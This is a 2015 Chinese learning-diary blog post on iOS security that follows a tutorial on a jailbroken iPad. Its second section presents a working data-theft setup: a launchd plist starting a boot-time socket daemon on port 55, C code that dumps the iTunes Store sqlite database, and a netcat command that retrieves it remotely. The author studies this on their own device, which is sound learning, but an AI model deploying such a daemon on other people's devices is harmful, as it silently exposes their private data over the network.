---
title: iOS安全-学习日记1
author: young
layout: post
dsq_thread_id:
  - 3579819693
categories:
  - 计算机
  - security
tags:
  - iOS
  - security
date: 2015-03-08
---
# 前(fei)言(hua)

上班之余，自学一些计算机安全一类的知识。有相关经验的同学给了我几个建议：1.计算机安全范围很广，有web啦，sql啦，移动端啦balabala，自己选择一个自己感兴趣的较窄的学习就好。2. 社区，乌云，看雪

我自己对iOS还有些兴趣，遂决定开始自学iOS安全。乌云我是连注册都没资格，需要提交漏洞才行，我这什么相关知识都不会，只先看看好了。在谷歌上搜了搜，很容易搜到CSDN上念茜的《iOS安全攻防》这个看上去知识比较浅一点，应该会适合我。那么就一课一课开始学。她写的相关博文是一两年前了，不一定百分之百能适用于当前的环境，不过正好是增加学习难度的机会。也可以用自己的博文来更新和更加详细的注释一下她的博客，更容易让初学者学习到。

#  iOS安全攻防（一）：Hack必备的命令与工具

[念茜博客原文地址][1]

先是一些操作系统的基本的命令，我用过并且略有了解的如下：ps, netstat, route, ifconfig, tcpdump, gdb, ssh

然后我没有接触过的：

sysctl：检查设定Kernel配置；renice：调整程序运行的优先级；lsof：列出当前系统打开的文件列表，一切皆文件包括网络，硬件设备；patch：补丁工具。

然后她有特意注释的三个工具，otool，可以查看可执行程序都链接了哪些库，nm，显示符号表，ldid，用于给需要运行在iOS上的程序签名用。otool和nm在自己的mac电脑上有，os x上我没找到ldid，于是在ipad上用cydia装了ldid。不过之后的实验中好像不签名也能运行来着。

<!--more-->

她的步骤一找编译器和SDK，她找的是llvm-gcc，我用的是clang，然后找到SDK的地址，很顺找到利/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS8.1.sdk

helloworld.c这是上大学第一堂C语言课就学了的。

我编译helloword用的命令为

<pre class="lang:sh decode:true">clang -o hello -arch armv7s hello.c -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS8.1.sdk
</pre>

-arch后面得注意了，什么型号对应什么CPU，自己上网查查先。很容易在[stackoverflow][2]上找到当前的一些设备的信息。

<div>
  ARMv8 / ARM64 = iPhone 5s, iPad Air, Retina iPad Mini
</div>

<div>
  ARMv7s = iPhone 5, iPhone 5c, iPad 4
</div>

<div>
  ARMv7  = iPhone 3GS, iPhone 4, iPhone 4S, iPod 3G/4G/5G, iPad, iPad 2, iPad 3, iPad Mini
</div>

<div>
  ARMv6  = iPhone, iPhone 3G, iPod 1G/2G
</div>

<div>
  -isysroot是用来指定SDK的。
</div>

<div>
  build出一个可执行文件，然后scp到我的ipad。然后ssh上去，ldid给这个可执行文件签名。再执行，就能看到helloworld了。
</div>

<div>
  这次实践下来最耗时的是自己上网去找到编译器clang和发现自己cpu型号写错这两个点，当打印出helloworld时，自己还是有欣喜感的。
</div>

# iOS安全攻防（二）：后台daemon非法窃取用户iTunesstore信息

<div>
  <a href="http://blog.csdn.net/yiyaaixuexi/article/details/8293020">念茜博客原文地址</a>
</div>

### 开机自启动程序

新建plist属性文件，按照她给的例子弄一个好了，然后稍微注意一下plist中的一些value，可执行文件的名字，就是之后步骤build出mydemo这个可执行文件，socket端口号自己记住一下，之后步骤有用到，这里用的是55

<pre class="lang:xhtml decode:true">&lt;?xml version="1.0" encoding="UTF-8"?&gt;  
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;  
&lt;plist version="1.0"&gt;  
&lt;dict&gt;  
    &lt;key&gt;Program&lt;/key&gt;  
    &lt;string&gt;/usr/bin/mydemo&lt;/string&gt;  
    &lt;key&gt;StandardErrorPath&lt;/key&gt;  
    &lt;string&gt;/dev/null&lt;/string&gt;  
    &lt;key&gt;SessionCreate&lt;/key&gt;  
    &lt;true/&gt;  
    &lt;key&gt;ProgramArguments&lt;/key&gt;  
    &lt;array&gt;  
        &lt;string&gt;/usr/bin/mydemo&lt;/string&gt;  
    &lt;/array&gt;  
    &lt;key&gt;inetdCompatibility&lt;/key&gt;  
    &lt;dict&gt;  
        &lt;key&gt;Wait&lt;/key&gt;  
        &lt;false/&gt;  
    &lt;/dict&gt;  
    &lt;key&gt;Sockets&lt;/key&gt;  
    &lt;dict&gt;  
        &lt;key&gt;Listeners&lt;/key&gt;  
        &lt;dict&gt;  
            &lt;key&gt;SockServiceName&lt;/key&gt;  
            &lt;string&gt;55&lt;/string&gt;  
        &lt;/dict&gt;  
    &lt;/dict&gt;  
&lt;/dict&gt;  
&lt;/plist&gt;</pre>

这里是她原文中的，根据Google出来的信息，还需要添加一个

<pre class="lang:xhtml decode:true">&lt;key&gt;label&lt;/key&gt;
&lt;string&gt;mydemo&lt;/string&gt;</pre>

然后她是将这个plist文件scp到设备的/System/Library/LaunchDaemons/目录下了，之后的步骤我都做好之后，试了半天没啥反应，估计是这里错了，后来从:[http://iphonedevwiki.net/index.php/Updating\_extensions\_for\_iOS\_8#What\_is\_new\_in\_iOS\_8.2C\_and\_how\_does\_it\_work.3F][3]  找到了原因。新版iOS的玩法略有不同，需要把plist文件放在目录 /Library/LaunchDaemons/下，然后用命令load /Library/LaunchDaemons/mydemo.plist即可。

### 编写读取某特定文件的程序

她是用的这样的C代码来读取某文件内容输出到标准输出流。

<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;  
#include &lt;fcntl.h&gt;  
#include &lt;stdlib.h&gt;  
  
#define FILE "/var/mobile/Library/com.apple.itunesstored/itunesstored2.sqlitedb"  
  
int main(){  
    int fd = open(FILE, O_RDONLY);  
    char buf[128];  
    int ret = 0;  
      
    if(fd &lt; 0)  
        return -1;  
    while (( ret = read(fd, buf, sizeof(buf))) &gt; 0){  
        write( fileno(stdout), buf, ret);  
    }  
    close(fd);  
    return 0;  
}</pre>

据说那个文件里能找到你安装了哪些app，经我实践，好像有些不一样，不知道是apple给这个文件加密或者混淆了还是怎么着，反正这么弄直接出来的结果，是看不到多少信息的，不过可以从那个目录下的其他的一些sqlitedb文件获取到类似的信息。

build这个文件为mydemo，然后scp到设备上，然后ldid -S mydemo，然后mv到/usr/bin目录下。

应该是这个程序就在后台开始运行了，或者重启设备之后mydemo就开始运行了

### netcat获取文件内容

<div>
  自己的电脑和ipad连在同一个wifi下，然后得知道ipad的ip地址。
</div>

<div>
  nc ip 55 > itunesstored2.sqlitedb
</div>

<div>
  这样，就能把之前C程序定义的FILE中的内容，获取到本地。然后用相应的软件来分析。
</div>

<div>
  她的博客中是用strings命令获取字符串之类的方式。我自己也从网上下载了sqlitebrowser这样的软件来打开这个文件，不过我没有直接看到我自己的app列表，尝试了一下那个目录下的其他sqlitedb文件，有类似的信息出现把。估计具体哪个文件存哪些信息可能需要之后再看看其他的说明书才能弄明白。
</div>

### 收获

Anyway，我了解了这样一个流程：通过plist文件的设置，可以从远端去获取越狱了的ipad上的指定文件的方法。

 [1]: http://blog.csdn.net/yiyaaixuexi/article/details/8288077
 [2]: http://stackoverflow.com/questions/6517822/do-i-need-to-add-armv6-support-when-limiting-apps-to-ios-4-0
 [3]: http://iphonedevwiki.net/index.php/Updating_extensions_for_iOS_8#What_is_new_in_iOS_8.2C_and_how_does_it_work.3F